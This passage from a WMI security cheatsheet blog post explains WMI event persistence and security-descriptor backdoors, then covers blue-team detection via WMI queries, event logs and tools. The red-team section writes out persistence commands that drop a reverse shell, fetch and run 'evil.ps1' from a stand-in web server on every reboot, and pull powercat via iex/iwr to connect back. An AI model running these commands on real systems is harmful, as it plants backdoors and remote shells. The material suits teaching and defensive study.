</span></span></code></pre></div><h3 id=persistence---wmi-events>Persistence - WMI Events</h3><p>WMI has an event infrastructure which provides the capability of receveing notifications and respond changes happening on a system. For example, an event can be triggered on user logon, process creation, registry change, file creation or change and so on. It is possible to create both synchronous or asynchronous queries in order to constanly monitor the system.</p><p>An <strong>event consumer</strong> (used to consume event) can be:</p><ul><li><strong>Temporary</strong>: Receives event notifications as long as the client application/host is active</li><li><strong>Permanent</strong>: Receives event notifications at all times (even across reboots), it is saved in the WMI repository and runs as SYSTEM.</li></ul><p><em>Permanent event consumers</em> are the most interesting and are characterized by:</p><ul><li><strong>Filter</strong>: The event which occurs</li><li><strong>Consumer</strong>: The action to be performed when the event occurs</li><li><strong>Binding</strong>: The established relationship between Filter and Consumer</li></ul><p>There are 2 types of WMI events:</p><ul><li><p><strong>Intrinsic</strong>: Events which are triggered on a change (creation, modification or deletion) in the standard WMI model. Intrinsic events are system classes included in every namespace. There is a polling time for most of them and it is possible to miss event firings. For example, the creation of a new instance of Win32_LogicalDisk is an __InstanceCreationEvent type.</p><ul><li>__NamespaceOperationEvent</li><li>__NamespaceModificationEvent</li><li>__NamespaceDeletionEvent</li><li>__NamespaceCreationEvent</li><li>__ClassOperationEvent</li><li>__ClassDeletionEvent</li><li>__ClassModificationEvent</li><li>__ClassCreationEvent</li><li>__InstanceOperationEvent</li><li>__InstanceCreationEvent</li><li>__MethodInvocationEvent</li><li>__InstanceModificationEvent</li><li>__InstanceDeletionEvent</li><li>__TimerEvent</li></ul></li><li><p><strong>Extrinsic</strong>: A predefined occurence that cannot be directly linked to changes in the WMI model. These events are defined by the providers themselves. They do not have as much coverage as intrinsic events. There is no chance of missing them. For example, a computer shutdown event.</p><ul><li>ROOT\CIMV2:Win32_ComputerShutdownEvent</li><li>ROOT\CIMV2:Win32_IP4RouteTableEvent</li><li>ROOT\CIMV2:Win32_ProcessStartTrace</li><li>ROOT\CIMV2:Win32_ModuleLoadTrace</li><li>ROOT\CIMV2:Win32_ThreadStartTrace</li><li>ROOT\CIMV2:Win32_VolumeChangeEvent</li><li>ROOT\CIMV2:Msft_WmiProvider*</li><li>ROOT\DEFAULT:RegistryKeyChangeEvent</li><li>ROOT\DEFAULT:RegistryValueChangeEvent</li></ul></li></ul><p><strong>Filters</strong> represent the definition of the event to trigger and take the form of a WMI query:</p><ul><li><strong>Intrinsic query</strong></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>SELECT </span><span class=p>*</span> <span class=n>FROM</span> <span class=n>__InstanceOperationEvent</span> <span class=n>WITHIN</span> <span class=mf>30</span> <span class=nb>WHERE </span><span class=p>((</span><span class=n>__CLASS</span> <span class=p>=</span> <span class=s2>&#34;__InstanceCreationEvent&#34;</span> <span class=n>OR</span> <span class=n>__CLASS</span> <span class=p>=</span> <span class=s2>&#34;__InstanceModificationEvent&#34;</span><span class=p>)</span> <span class=n>AND</span> <span class=n>TargetInstance</span> <span class=n>ISA</span> <span class=s2>&#34;CIM_DataFile&#34;</span><span class=p>)</span> <span class=n>AND</span> <span class=p>(</span><span class=n>TargetInstance</span><span class=p>.</span><span class=py>Extension</span> <span class=p>=</span> <span class=s2>&#34;doc&#34;</span><span class=p>)</span> <span class=n>OR</span> <span class=p>(</span><span class=n>TargetInstance</span><span class=p>.</span><span class=py>Extension</span> <span class=p>=</span> <span class=s2>&#34;docx&#34;</span><span class=p>)</span> 
</span></span></code></pre></div><ul><li><strong>Extrinsic query</strong></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>SELECT </span><span class=p>*</span> <span class=n>FROM</span> <span class=n>Win32_VolumeChangeEvent</span> <span class=nb>WHERE </span><span class=n>EventType</span> <span class=p>=</span> <span class=mf>2</span> 
</span></span></code></pre></div><p>These are the standard event <strong>consumers</strong>:</p><table><thead><tr><th>Class</th><th>Description</th></tr></thead><tbody><tr><td><strong>ActiveScriptEventConsumer</strong></td><td>Executes a predefined VBScript or Jscript</td></tr><tr><td><strong>CommandLineEventConsumer</strong></td><td>Launches a process with SYSTEM privileges</td></tr><tr><td>LogFileEventConsumer</td><td>Write data to a log file</td></tr><tr><td>NTEventLogEventConsumer</td><td>Logs a message to the Windows event log</td></tr><tr><td>SMTPEventConsumer</td><td>Sends an email using SMTP</td></tr></tbody></table><p>and are present in the following namespaces:</p><ul><li>ROOT\CIMV2</li><li>ROOT\DEFAULT</li></ul><p>Events can be exploited to add persistence to a box by using <code>Add-Persistence.ps1</code> from <code>Nishang</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=c># It is convenient to setup a persistent listener</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=n>powercat</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=n>powercat</span> <span class=n>-l</span> <span class=n>-v</span> <span class=n>-p</span> <span class=mf>8080</span> <span class=n>-t</span> <span class=mf>1000</span> <span class=n>-rep</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Utility/Add-Persistence.ps1</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Add-Persistence</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Drop the reverse shell PowerShell script and WindowsSanity.vbs on the target box. The VBscript file and thus the PowerShell payload will be executed on every reboot. Please note that C:\test\Invoke-PowerShellTcpOneLine.ps1 is the path on the target machine.</span>
</span></span><span class=line><span class=cl><span class=nb>Add-Persistence</span> <span class=n>-PayloadPath</span> <span class=n>C:</span><span class=p>\</span><span class=n>test</span><span class=p>\</span><span class=nb>Invoke-PowerShellTcpOneLine</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Use the above to download and execute in memory the evil.ps1 script everytime the target machine reboots.</span>
</span></span><span class=line><span class=cl><span class=nb>Add-Persistence</span> <span class=n>-PayloadURL</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=n>yourwebserver</span><span class=p>/</span><span class=n>evil</span><span class=p>.</span><span class=py>ps1</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># The backdoor will be activated after 4 minutes of system uptime</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Utility/Remove-Persistence.ps1</span>
</span></span><span class=line><span class=cl><span class=p>.</span> <span class=p>.\</span><span class=nb>Remove-Persistence</span><span class=p>.</span><span class=py>ps1</span>
</span></span><span class=line><span class=cl><span class=nb>Remove-Persistence</span> <span class=n>-Remove</span>
</span></span></code></pre></div><p>The same result can be achieved by <code>Persistence.psm1</code> from <code>PowerSploit</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># PowerSploit</span>
</span></span><span class=line><span class=cl><span class=nb>Import-Module</span> <span class=n>Persistence</span><span class=p>.</span><span class=py>psm1</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl><span class=nb>Get-Command</span> <span class=n>-Module</span> <span class=n>Persistence</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Creates a script containing the contents of EvilPayload.ps1 that when executed with the &#39;-Persist&#39; switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime.</span>
</span></span><span class=line><span class=cl><span class=nv>$ElevatedOptions</span> <span class=p>=</span> <span class=nb>New-ElevatedPersistenceOption</span> <span class=n>-PermanentWMI</span> <span class=n>-Daily</span> <span class=n>-At</span> <span class=s1>&#39;3 PM&#39;</span>
</span></span><span class=line><span class=cl><span class=nv>$UserOptions</span> <span class=p>=</span> <span class=nb>New-UserPersistenceOption</span> <span class=n>-Registry</span> <span class=n>-AtLogon</span>
</span></span><span class=line><span class=cl><span class=nb>Add-Persistence</span> <span class=n>-FilePath</span> <span class=p>.\</span><span class=n>EvilPayload</span><span class=p>.</span><span class=py>ps1</span> <span class=n>-ElevatedPersistenceOption</span> <span class=nv>$ElevatedOptions</span> <span class=n>-UserPersistenceOption</span> <span class=nv>$UserOptions</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Creates a script containing the contents of the provided scriptblock that when executed with the &#39;-Persist&#39; switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime. The output is then passed through to Out-EncodedCommand so that it can be executed in a single command line statement. The final, encoded output is finally saved to .\EncodedPersistentScript.ps1</span>
</span></span><span class=line><span class=cl><span class=nv>$Rickroll</span> <span class=p>=</span> <span class=p>{</span> <span class=nb>iex </span><span class=p>(</span><span class=nb>iwr </span><span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>raw</span><span class=p>.</span><span class=py>githubusercontent</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>besimorhino</span><span class=p>/</span><span class=n>powercat</span><span class=p>/</span><span class=n>master</span><span class=p>/</span><span class=n>powercat</span><span class=p>.</span><span class=n>ps1</span><span class=p>);</span> <span class=n>powercat</span> <span class=n>-c</span> <span class=n>ws01</span> <span class=n>-p</span> <span class=mf>8081</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$ElevatedOptions</span> <span class=p>=</span> <span class=nb>New-ElevatedPersistenceOption</span> <span class=n>-ScheduledTask</span> <span class=n>-OnIdle</span>
</span></span><span class=line><span class=cl><span class=nv>$UserOptions</span> <span class=p>=</span> <span class=nb>New-UserPersistenceOption</span> <span class=n>-ScheduledTask</span> <span class=n>-OnIdle</span>
</span></span><span class=line><span class=cl><span class=nb>Add-Persistence</span> <span class=n>-ScriptBlock</span> <span class=nv>$RickRoll</span> <span class=n>-ElevatedPersistenceOption</span> <span class=nv>$ElevatedOptions</span> <span class=n>-UserPersistenceOption</span> <span class=nv>$UserOptions</span> <span class=n>-Verbose</span> <span class=n>-PassThru</span> <span class=p>|</span> <span class=nb>Out-EncodedCommand</span> <span class=p>|</span> <span class=nb>Out-File</span> <span class=p>.\</span><span class=n>EncodedPersistentScript</span><span class=p>.</span><span class=py>ps1</span>
</span></span></code></pre></div><p>by <code>WMIBackdoor.ps1</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Select the trigger</span>
</span></span><span class=line><span class=cl><span class=nv>$trigger</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorTrigger</span> <span class=n>-TimingInterval</span> <span class=p>&lt;</span><span class=n>uint32</span><span class=p>&gt;</span> <span class=p>[</span><span class=n>-TimerName</span> <span class=p>&lt;</span><span class=n>string</span><span class=p>&gt;]</span> <span class=p>[</span><span class=n>-TriggerName</span> <span class=p>&lt;</span><span class=n>string</span><span class=p>&gt;]</span>
</span></span><span class=line><span class=cl><span class=nv>$trigger</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorTrigger</span> <span class=n>-Datetime</span> <span class=p>&lt;</span><span class=n>datetime</span><span class=p>&gt;</span> 
</span></span><span class=line><span class=cl><span class=nv>$trigger</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorTrigger</span> <span class=n>-ProcessName</span> <span class=p>&lt;</span><span class=n>string</span><span class=p>&gt;</span>  
</span></span><span class=line><span class=cl><span class=nv>$trigger</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorTrigger</span> <span class=n>-NewOrModifiedFileExtensions</span> <span class=p>&lt;</span><span class=n>string</span><span class=p>[]&gt;</span> 
</span></span><span class=line><span class=cl><span class=nv>$trigger</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorTrigger</span> <span class=err>â€“</span><span class=n>LockedScreen</span> 
</span></span><span class=line><span class=cl><span class=nv>$trigger</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorTrigger</span> <span class=err>â€“</span><span class=n>InteractiveLogon</span> 
</span></span><span class=line><span class=cl><span class=nv>$trigger</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorTrigger</span> <span class=err>â€“</span><span class=n>DriveInsertion</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Select the action</span>
</span></span><span class=line><span class=cl><span class=nv>$action</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorAction</span> <span class=n>-C2Uri</span> <span class=p>&lt;</span><span class=n>uri</span><span class=p>&gt;</span> <span class=n>-FileUpload</span> 
</span></span><span class=line><span class=cl><span class=nv>$action</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorAction</span> <span class=n>-C2Uri</span> <span class=p>&lt;</span><span class=n>uri</span><span class=p>&gt;</span> <span class=n>-Backdoor</span> 
</span></span><span class=line><span class=cl><span class=nv>$action</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorAction</span> <span class=n>-KillProcess</span> 
</span></span><span class=line><span class=cl><span class=nv>$action</span> <span class=p>=</span> <span class=nb>New-WMIBackdoorAction</span> <span class=n>-InfectDriv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Register the backdoor</span>
</span></span><span class=line><span class=cl><span class=nb>Register-WMIBackdoor</span> <span class=n>-Trigger</span> <span class=nv>$trigger</span> <span class=n>-Action</span> <span class=nv>$action</span> <span class=p>[[</span><span class=n>-ComputerName</span><span class=p>]</span> <span class=p>&lt;</span><span class=n>string</span><span class=p>&gt;]</span>
</span></span></code></pre></div><p>or even by compiling MOF files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Compile a MOF file on the local machine</span>
</span></span><span class=line><span class=cl><span class=n>mofcomp</span><span class=p>.</span><span class=py>exe</span> <span class=n>c:</span><span class=p>\</span><span class=n>users</span><span class=p>\</span><span class=n>administrator</span><span class=p>\</span><span class=n>test</span><span class=p>.</span><span class=py>mof</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Compile a MOF file on a remote machine (need privs)</span>
</span></span><span class=line><span class=cl><span class=n>mofcomp</span><span class=p>.</span><span class=py>exe</span> <span class=n>-N</span> <span class=p>\\</span><span class=n>COMPUTER01</span><span class=p>\</span><span class=n>root</span><span class=p>\</span><span class=n>subscription</span> <span class=n>c:</span><span class=p>\</span><span class=n>users</span><span class=p>\</span><span class=n>administrator</span><span class=p>\</span><span class=n>test</span><span class=p>.</span><span class=py>mof</span>
</span></span></code></pre></div><h3 id=persistence---wmi-security-descriptors>Persistence - WMI Security Descriptors</h3><p>It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of DCOM and WMI namespace to allow access to non-admin users. It obviousely requires admin privileges.</p><p><a href=https://itconnect.uw.edu/wares/msinf/other-help/understanding-sddl-syntax/ target=_blank rel=noopener>Security Descriptor Definition Language</a> uses ACE for both DACL and SACL:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid
</span></span></code></pre></div><p>which for built-in administrators for WMI namespaces becomes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>A;CI;CCDCLCSWRPWPRCWD;;;SID
</span></span></code></pre></div><table><thead><tr><th>Field</th><th>Example</th></tr></thead><tbody><tr><td>ace_type</td><td>&ldquo;A&rdquo; - Access Allowed</td></tr><tr><td>ace_flags</td><td>&ldquo;CI&rdquo; - Container Inherit</td></tr><tr><td>rights</td><td>&ldquo;CC&rdquo; - Create Child<br>&ldquo;DC&rdquo; - Delete Child<br>&ldquo;LC&rdquo; - List Children<br>&ldquo;SW&rdquo; - Self Write<br>&ldquo;RP&rdquo; - Read Property<br>&ldquo;WP&rdquo; - Write Property<br>&ldquo;RC&rdquo; - Read Control<br>&ldquo;WD&rdquo; - Write DAC</td></tr><tr><td>account_sid</td><td>SID that identifies the trustee (user, group, &mldr;) on which the ACE applies</td></tr></tbody></table><p><code>Nishang</code> script <code>Set-RemoteWMI.ps1</code> can be used to modify Security Descriptors of DCOM and WMI namespaces to provide non-admin domain users access to WMI:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
</span></span><span class=line><span class=cl><span class=c># backdoor/Set-RemoteWMI.ps1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Add permissions on the local machine for labuser to access all namespaces remotely.</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemoteWMI</span> <span class=n>-UserName</span> <span class=n>labuser</span> <span class=err>â€“</span><span class=n>Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Add permissions on the remote machine for labuser to access all namespaces remotely.</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemoteWMI</span> <span class=n>-UserName</span> <span class=n>labuser</span> <span class=n>-ComputerName</span> <span class=mf>192.168</span><span class=p>.</span><span class=py>0</span><span class=p>.</span><span class=py>34</span> <span class=n>-Credential</span> <span class=n>admin</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Add permissions on the remote machine for labuser to access root\cimv2 and nested namespaces remotely.</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemoteWMI</span> <span class=n>-UserName</span> <span class=n>labuser</span> <span class=n>-ComputerName</span> <span class=mf>192.168</span><span class=p>.</span><span class=py>0</span><span class=p>.</span><span class=py>34</span> <span class=n>-Credential</span> <span class=n>admin</span> <span class=err>â€“</span><span class=n>namespace</span> <span class=s1>&#39;root\cimv2&#39;</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Add permissions on the remote machine for labuser to access only root\cimv2 remotely.</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemoteWMI</span> <span class=n>-UserName</span> <span class=n>labuser</span> <span class=n>-ComputerName</span> <span class=mf>192.168</span><span class=p>.</span><span class=py>0</span><span class=p>.</span><span class=py>34</span> <span class=n>-Credential</span> <span class=n>admin</span> <span class=err>â€“</span><span class=n>namespace</span> <span class=s1>&#39;root\cimv2&#39;</span> <span class=n>-NotAllNamespaces</span> <span class=n>-Verbose</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Remove the permissions added for labuser from the remote machine.</span>
</span></span><span class=line><span class=cl><span class=nb>Set-RemoteWMI</span> <span class=n>-UserName</span> <span class=n>labuser</span> <span class=n>-ComputerName</span> <span class=mf>192.168</span><span class=p>.</span><span class=py>0</span><span class=p>.</span><span class=py>34</span> <span class=n>-Credential</span> <span class=n>admin</span> <span class=n>-Remove</span> <span class=n>-Verbose</span>
</span></span></code></pre></div><h3 id=red-team-tools>Red Team Tools</h3><ul><li><a href=https://github.com/0xbadjuju/PowerProvider target=_blank rel=noopener>PowerProvider</a></li><li><a href=https://github.com/0xbadjuju/WheresMyImplant target=_blank rel=noopener>WheresMyImplant</a></li><li><a href=https://github.com/Sw4mpf0x/PowerLurk target=_blank rel=noopener>PowerLurk</a></li><li><a href=https://github.com/FortyNorthSecurity/WMImplant target=_blank rel=noopener>WMIImplant</a></li></ul><h2 id=wmi-for-blue-teams>WMI for Blue Teams</h2><h3 id=detecting-persistence>Detecting persistence</h3><p>To detect persistence, common Filters, Consumer and Binding can be manually analyzed or a &ldquo;detection&rdquo; permanent event consumer can be created.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>__EventFilter</span> <span class=n>-namespace</span> <span class=s2>&#34;root\subscription&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>__EventConsumer</span> <span class=n>-namespace</span> <span class=s2>&#34;root\subscription&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>__FilterToConsumerBinding</span> <span class=n>-namespace</span> <span class=s2>&#34;root\subscription&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>ActiveScriptEventConsumer</span> <span class=n>-namespace</span> <span class=s2>&#34;root\subscription&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>CommandLineEventConsumer</span> <span class=n>-namespace</span> <span class=s2>&#34;root\subscription
</span></span></span></code></pre></div><p>Use WMI permanent event consumer to alert on:</p><ul><li>Registry persistence</li><li>RegistryKeyChangeEvent</li><li>RegistryValueChangeEvent</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$query</span> <span class=p>=</span> <span class=s2>&#34;select * from RegistryValueChangeEvent where HIVE=&#39;HKEY_LOCAL_MACHINE&#39; AND KeyPath=&#39;Software\\Microsoft\\Ole&#39; AND ValueName=&#39;MachineLaunchRestriction&#39;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Register-WmiEvent</span> <span class=n>-Query</span> <span class=nv>$query</span> <span class=n>-Action</span> <span class=p>{</span><span class=nb>Write-Host</span> <span class=s2>&#34;Modification of DCOM Permissions&#34;</span><span class=p>}</span>
</span></span></code></pre></div><h3 id=detecting-storage-and-communication-channels>Detecting storage and communication channels</h3><p>Use WMI permanent event consumer to alert on the creation of:</p><ul><li><strong>Namespaces</strong>: instances of __NamespaceCreationEvent</li><li><strong>Classes</strong>: instances of __ClassCreationEvent</li></ul><h3 id=analyzing-wmi-logs>Analyzing WMI Logs</h3><ul><li><strong>Service Logs</strong>: Windows 10 and Windows Server 2016 raise <strong>Event ID 5861</strong> in WMI-Activity Operational Logs when a permanent event consumer is created</li><li><strong>Trace Logs</strong>: Huge volume, but very useful. <strong>Event ID 11</strong> tells the username, command and remote box from someone connected to the local box and combined to <strong>Event ID 20</strong> is useful for detecting persistence.</li></ul><h3 id=blue-team-tools>Blue Team Tools</h3><p>The following tools can be used for Blue Teams:</p><ul><li><a href=https://github.com/luctalpe/WMIMon target=_blank rel=noopener>WMIMon</a> is a real-time Event Trace Log (ETL) consumer for WMI-Activity log</li><li><a href=https://github.com/realparisi/WMI_Monitor target=_blank rel=noopener>WMI_Monitor</a> uses WMI permanent consumers to monitor the creation of other consumers. <code>New-EventSubscribeMonitor</code> creates an entry with <strong>Event ID 8</strong> in Application Event Log with source WSH.</li><li><a href=https://github.com/proxb/PoshEventUI target=_blank rel=noopener>PoshEventUI</a></li><li><a href=https://github.com/PowerShellMafia/CimSweep target=_blank rel=noopener>CIMSweep</a> performs incident response and hunting operations on scale by leveraging WMI/CIM.</li><li><a href=https://github.com/fireeye/flare-wmi/tree/master/WMI-IDS target=_blank rel=noopener>WMI-IDS</a> is a PoC agent-less host intrusion detection system. It is useful for detecting persistence mechanisms and raise alerts based on triggers.</li><li><a href=https://github.com/davehull/Kansa target=_blank rel=noopener>Kansa</a></li></ul><h2 id=tools>Tools</h2><ul><li><a href=https://gallery.technet.microsoft.com/scriptcenter/890ff802-9db2-4d25-aa13-4a2b22fe5db3 target=_blank rel=noopener>Get-WmiNamespace.ps1</a></li><li><a href=https://github.com/rzander/LocalAdmins target=_blank rel=noopener>Win32_LocalAdmins</a></li><li><a href=https://github.com/jaredcatkinson/EvilNetConnectionWMIProvider target=_blank rel=noopener>Evil NEtwork Connection WMI Provider</a></li><li><a href=https://github.com/0xbadjuju/PowerProvider target=_blank rel=noopener>PowerProvider</a></li><li><a href=https://github.com/0xbadjuju/WheresMyImplant target=_blank rel=noopener>WheresMyImplant</a></li><li><a href=https://github.com/Sw4mpf0x/PowerLurk target=_blank rel=noopener>PowerLurk</a></li><li><a href=https://github.com/FortyNorthSecurity/WMImplant target=_blank rel=noopener>WMIImplant</a></li><li><a href=https://github.com/luctalpe/WMIMon target=_blank rel=noopener>WMIMon</a></li><li><a href=https://github.com/proxb/PoshEventUI target=_blank rel=noopener>PoshEventUI</a></li><li><a href=https://github.com/PowerShellMafia/CimSweep target=_blank rel=noopener>CIMSweep</a></li><li><a href=https://github.com/fireeye/flare-wmi/tree/master/WMI-IDS target=_blank rel=noopener>WMI-IDS</a></li><li><a href=https://github.com/davehull/Kansa target=_blank rel=noopener>Kansa</a></li></ul><h2 id=references>References</h2><ul><li><a href=https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page target=_blank rel=noopener>Windows Management Instrumentation</a></li><li><a href=https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-service target=_blank rel=noopener>Win32_Service</a></li><li><a href=https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process target=_blank rel=noopener>Win32_Process</a></li><li><a href=https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-scheduledjob target=_blank rel=noopener>Win32_ScheduledJob</a></li><li><a href=https://github.com/rzander/LocalAdmins target=_blank rel=noopener>Win32_LocalAdmins</a></li><li><a href=https://itconnect.uw.edu/wares/msinf/other-help/understanding-sddl-syntax/ target=_blank rel=noopener>Understanding SDDL Syntax</a></li><li><a href=https://github.com/fireeye/flare-wmi/tree/master/DEFCON_23_Presentation target=_blank rel=noopener>DEF CON 23 slides and demo videos</a></li><li><a href=https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf target=_blank rel=noopener>Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asyncronous, and Fileless Backdoor</a></li><li><a href=https://cansecwest.com/slides/2015/There%27s%20Something%20about%20WMI%20-%20Chris%20Glyer.pptx target=_blank rel=noopener>There&rsquo;s something about WMI</a></li><li><a href=https://www.slideshare.net/AlexanderLeary/building-better-backdoors-with-wmi-derbycon-2017 target=_blank rel=noopener>Building better backdoors with WMI</a></li></ul></div><div class=article-tags><a class="badge badge-light" href=/tag/red-teaming/>Red Teaming</a>
<a class="badge badge-light" href=/tag/windows/>Windows</a>
<a class="badge badge-light" href=/tag/active-directory/>Active Directory</a>
<a class="badge badge-light" href=/tag/wmi/>WMI</a></div><div class=share-box><ul class=share><li><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0080-wmi-cheatsheet%2F&amp;text=Windows+Management+Instrumentation+cheatsheet" target=_blank rel=noopener class=share-btn-twitter aria-label=twitter><i class="fab fa-twitter"></i></a></li><li><a href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0080-wmi-cheatsheet%2F&amp;t=Windows+Management+Instrumentation+cheatsheet" target=_blank rel=noopener class=share-btn-facebook aria-label=facebook><i class="fab fa-facebook"></i></a></li><li><a href="mailto:?subject=Windows%20Management%20Instrumentation%20cheatsheet&amp;body=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0080-wmi-cheatsheet%2F" target=_blank rel=noopener class=share-btn-email aria-label=envelope><i class="fas fa-envelope"></i></a></li><li><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0080-wmi-cheatsheet%2F&amp;title=Windows+Management+Instrumentation+cheatsheet" target=_blank rel=noopener class=share-btn-linkedin aria-label=linkedin-in><i class="fab fa-linkedin-in"></i></a></li><li><a href="whatsapp://send?text=Windows+Management+Instrumentation+cheatsheet%20https%3A%2F%2Fwww.peco602.com%2Fpost%2F0080-wmi-cheatsheet%2F" target=_blank rel=noopener class=share-btn-whatsapp aria-label=whatsapp><i class="fab fa-whatsapp"></i></a></li><li><a href="https://service.weibo.com/share/share.php?url=https%3A%2F%2Fwww.peco602.com%2Fpost%2F0080-wmi-cheatsheet%2F&amp;title=Windows+Management+Instrumentation+cheatsheet" target=_blank rel=noopener class=share-btn-weibo aria-label=weibo><i class="fab fa-weibo"></i></a></li></ul></div><div class="media author-card content-widget-hr"><a href=https://www.peco602.com/><img class="avatar mr-3 avatar-circle" src=/authors/admin/avatar_huf4f2a9d771509e6e0b947acc7d389632_627121_270x270_fill_q75_lanczos_center.jpg alt="Giovanni Pecoraro"></a><div class=media-body><h5 class=card-title><a href=https://www.peco602.com/>Giovanni Pecoraro</a></h5><h6 class=card-subtitle>Senior Security Engineer</h6><p class=card-text>My research interests include space systems, cyber security, signal processing and artificial intelligence.</p><ul class=network-icon aria-hidden=true><li><a href=/#contact><i class="fas fa-envelope"></i></a></li><li><a href=https://twitter.com/Peco602 target=_blank rel=noopener><i class="fab fa-twitter"></i></a></li><li><a href="https://scholar.google.com/citations?user=JSM2EcoAAAAJ" target=_blank rel=noopener><i class="ai ai-google-scholar"></i></a></li><li><a href=https://www.researchgate.net/profile/Giovanni-Pecoraro target=_blank rel=noopener><i class="fab fa-researchgate"></i></a></li><li><a href=https://github.com/Peco602 target=_blank rel=noopener><i class="fab fa-github"></i></a></li><li><a href=https://it.linkedin.com/in/giovanni-pecoraro-078500155 target=_blank rel=noopener><i class="fab fa-linkedin"></i></a></li><li><a href=/uploads/resume.pdf><i class="ai ai-cv"></i></a></li></ul></div></div><script src=https://utteranc.es/client.js repo=Peco602/peco602.github.io issue-term=pathname label=comment theme=github-light crossorigin=anonymous async></script></div></article></div><div class=page-footer><div class=container><footer class=site-footer><p class="powered-by copyright-license-text">Â© 2023 Me. This work is licensed under <a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank>CC BY NC ND 4.0</a></p><p class="powered-by footer-license-icons"><a href=https://creativecommons.org/licenses/by-nc-nd/4.0 rel="noopener noreferrer" target=_blank aria-label="Creative Commons"><i class="fab fa-creative-commons 